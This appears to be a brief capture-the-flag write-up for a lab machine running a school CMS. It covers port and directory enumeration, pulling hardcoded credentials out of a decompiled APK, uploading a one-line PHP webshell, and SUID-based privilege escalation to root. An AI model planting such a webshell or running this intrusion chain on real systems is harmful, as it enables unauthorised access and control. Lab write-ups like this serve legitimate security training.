# Educated
> Free School CMS + jadx APK reversing

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

"Free School" application identified. APK available for download.

## Exploitation

APK analysis with `jadx` to extract hardcoded credentials:

```
jadx -d output/ app.apk
grep -r "password\|secret\|api_key" output/
```

Credentials found in decompiled Java code.

Admin panel access → PHP webshell upload.

```
# webshell.php
<?php system($_GET['cmd']); ?>
```

Reverse shell obtained.

## Privilege Escalation

```
sudo -l
find / -perm -4000 2>/dev/null
```

Escalation path via SUID binary or sudo configuration.

```
/bin/bash -p
```

Root obtained.
